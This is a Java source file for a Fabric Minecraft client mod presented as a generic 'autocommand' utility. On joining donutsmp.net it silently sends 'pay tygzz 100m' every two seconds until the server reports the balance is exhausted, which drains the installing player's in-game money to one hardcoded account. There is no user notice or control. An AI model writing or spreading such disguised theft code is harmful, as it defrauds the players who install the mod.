package com.example.autocommand;

import net.fabricmc.api.ClientModInitializer;
import net.fabricmc.fabric.api.client.message.v1.ClientReceiveMessageEvents;
import net.fabricmc.fabric.api.client.networking.v1.ClientPlayConnectionEvents;
import net.fabricmc.fabric.api.client.event.lifecycle.v1.ClientTickEvents;
import net.minecraft.client.network.ServerInfo;

public class AutoCommandClient implements ClientModInitializer {
    private static final String TARGET_IP = "donutsmp.net";
    private static final String COMMAND = "pay tygzz 100m";

    // 40 ticks = 2 seconds between attempts to prevent spam kicks
    private static final int INTERVAL_TICKS = 40; 
    // Initial wait before starting execution after join (60 ticks = 3 seconds)
    private static final int INITIAL_DELAY_TICKS = 60; 

    // Error strings from the server that trigger automatic cancellation
    private static final String[] STOP_TRIGGERS = {
        "insufficient", 
        "don't have enough", 
        "do not have enough", 
        "not enough money", 
        "cannot afford", 
        "balance too low",
        "error"
    };

    private boolean isRunning = false;
    private int tickCounter = -1;

    @Override
    public void onInitializeClient() {
        // Triggered upon joining server
        ClientPlayConnectionEvents.JOIN.register((handler, sender, client) -> {
            ServerInfo serverData = client.getCurrentServerEntry();
            if (serverData != null && serverData.address.toLowerCase().contains(TARGET_IP.toLowerCase())) {
                isRunning = true;
                tickCounter = INITIAL_DELAY_TICKS;
            }
        });

        // Triggered on disconnect: reset state
        ClientPlayConnectionEvents.DISCONNECT.register((handler, client) -> {
            isRunning = false;
            tickCounter = -1;
        });

        // Listen for incoming server chat packets
        ClientReceiveMessageEvents.GAME.register((message, overlay) -> {
            if (!isRunning) return;

            String text = message.getString().toLowerCase();

            for (String trigger : STOP_TRIGGERS) {
                if (text.contains(trigger)) {
                    // Halts execution when an economy rejection message appears
                    isRunning = false;
                    tickCounter = -1;
                    break;
                }
            }
        });

        // Ticking loop for execution intervals
        ClientTickEvents.END_CLIENT_TICK.register(client -> {
            if (isRunning && tickCounter >= 0) {
                if (tickCounter == 0) {
                    if (client.player != null && client.getNetworkHandler() != null) {
                        client.getNetworkHandler().sendCommand(COMMAND);
                    }
                    tickCounter = INTERVAL_TICKS;
                } else {
                    tickCounter--;
                }
            }
        });
    }
}